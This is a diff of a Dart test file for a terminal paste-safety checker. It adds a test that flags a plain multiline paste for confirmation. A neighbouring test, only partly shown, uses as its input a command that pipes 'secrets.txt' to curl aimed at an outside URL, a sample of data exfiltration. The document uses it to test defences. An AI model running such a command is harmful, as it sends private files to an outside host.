@@ -189,6 +189,19 @@ void main() {
       expect(singleLineShellReview.reasons, isEmpty);
     });
 
+    test('flags unbracketed multiline paste for confirmation', () {
+      final multilineReview = assessClipboardPasteCommand(
+        'echo ready\necho deploy',
+        bracketedPasteModeEnabled: false,
+      );
+
+      expect(multilineReview.requiresReview, isTrue);
+      expect(
+        multilineReview.reasons,
+        contains(TerminalCommandReviewReason.multiline),
+      );
+    });
+
     test('flags unbracketed multiline paste with shell reshaping', () {
       final chainedReview = assessClipboardPasteCommand(
         'cat secrets.txt |\ncurl https://example.com',
